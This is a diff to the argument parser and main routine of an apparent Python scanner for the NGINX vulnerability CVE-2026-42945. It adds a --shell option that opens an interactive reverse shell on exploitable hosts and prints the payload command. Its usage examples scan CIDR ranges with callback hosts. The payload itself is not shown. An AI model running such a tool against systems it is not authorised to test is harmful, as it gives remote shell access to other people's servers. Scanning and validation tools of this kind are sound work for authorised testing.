@@ -14,39 +14,45 @@ from scanner.targets import parse_ports, validate_listen_host
 
 def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
-        description="Scan for CVE-2026-42945 (NGINX Rift) and catch a reverse shell if exploitable.",
+        description="Scan for CVE-2026-42945 (NGINX Rift).",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=(
-            "Usage:\n"
+            "Fingerprint only:\n"
+            "  python3 scan.py <target> -o report.json\n"
+            "\n"
+            "Fingerprint + reverse-shell validation (auto when listen set):\n"
             "  python3 scan.py <target> --listen-ip <host> --listen-port <port>\n"
             "\n"
-            "Target: single IP, CIDR (10.0.0.0/24), or range (10.0.0.1-10.0.0.50)\n"
+            "Interactive shell + show payload command:\n"
+            "  python3 scan.py <target> --shell --listen-ip <host> --listen-port <port>\n"
             "\n"
             "Examples:\n"
-            "  python3 scan.py 127.0.0.1 --listen-ip host.docker.internal --listen-port 4444\n"
-            "  python3 scan.py 10.0.0.0/24 --listen-ip 172.17.0.1 --listen-port 1337 --ports 19321\n"
-            "\n"
-            "Fingerprint-only (no exploit):\n"
             "  python3 scan.py 10.0.0.0/24 -o report.json\n"
+            "  python3 scan.py 127.0.0.1 --listen-ip host.docker.internal --listen-port 4444\n"
+            "  python3 scan.py 127.0.0.1 --shell --listen-ip host.docker.internal --listen-port 4444\n"
         ),
     )
     parser.add_argument(
         "target",
-        metavar="target",
         help="IPv4 target: single IP, CIDR, or start-end range",
+    )
+    parser.add_argument(
+        "--shell",
+        action="store_true",
+        help="Interactive reverse shell session and print payload command",
     )
     parser.add_argument(
         "--listen-ip",
         "--lhost",
         metavar="HOST",
-        help="Your callback host (IPv4 or hostname, e.g. host.docker.internal)",
+        help="Callback host for reverse-shell validation",
     )
     parser.add_argument(
         "--listen-port",
         "--lport",
         metavar="PORT",
         type=int,
-        help="Your callback port for reverse shell",
+        help="Callback port for reverse-shell validation",
     )
     parser.add_argument(
         "--ports",
@@ -78,15 +84,18 @@ def validate_args(args: argparse.Namespace) -> None:
     if has_ip ^ has_port:
         raise ValueError("--listen-ip and --listen-port must be used together")
 
+    if args.shell and not (has_ip and args.listen_port is not None):
+        raise ValueError("--shell requires --listen-ip and --listen-port")
+
     if has_ip and has_port:
         if not 1 <= args.listen_port <= 65535:
             raise ValueError(f"listen port out of range: {args.listen_port}")
         args.listen_ip = validate_listen_host(args.listen_ip)
-        args.validate_shell = True
-        args.interactive_shell = True
+        args.exploit_validate = True
         args.validate_all_open = True
+        args.interactive_shell = args.shell
     else:
-        args.validate_shell = False
+        args.exploit_validate = False
         args.interactive_shell = False
         args.validate_all_open = False
         args.listen_ip = ""
@@ -103,7 +112,8 @@ def config_from_args(args: argparse.Namespace) -> ScanConfig:
         probe_path=args.probe_path,
         output=args.output,
         quiet=args.quiet,
-        validate_shell=args.validate_shell,
+        exploit_validate=args.exploit_validate,
+        shell=args.shell,
         interactive_shell=args.interactive_shell,
         listen_ip=args.listen_ip,
         listen_port=args.listen_port,
@@ -129,12 +139,14 @@ def main(argv: list[str] | None = None) -> int:
         print(f"[!] {exc}", file=sys.stderr)
         return 2
 
-    if config.validate_shell and not config.quiet:
-        print(format_scan_command(config.ip_range, config.listen_ip, config.listen_port))
+    if config.exploit_validate and not config.quiet:
         print(
-            f"[*] Listening on 0.0.0.0:{config.listen_port} "
-            f"— target will connect to {config.listen_ip}:{config.listen_port}\n"
+            f"[*] Reverse-shell validation on 0.0.0.0:{config.listen_port} "
+            f"(callback {config.listen_ip}:{config.listen_port})"
         )
+        if config.shell:
+            print(format_scan_command(config.ip_range, config.listen_ip, config.listen_port))
+        print()
 
     try:
         scanner = Scanner(config)
@@ -145,8 +157,9 @@ def main(argv: list[str] | None = None) -> int:
         return 2
 
     if not config.quiet:
-        print(f"\n[*] Summary: {scanner.summarize()}")
-        print(f"[+] Report written to {config.output}")
+        total_vuln = len(scanner.vulnerable_results())
+        print(f"\n[*] Vulnerable: {total_vuln}")
+        print(f"[+] {config.output}")
     return 0
 
 
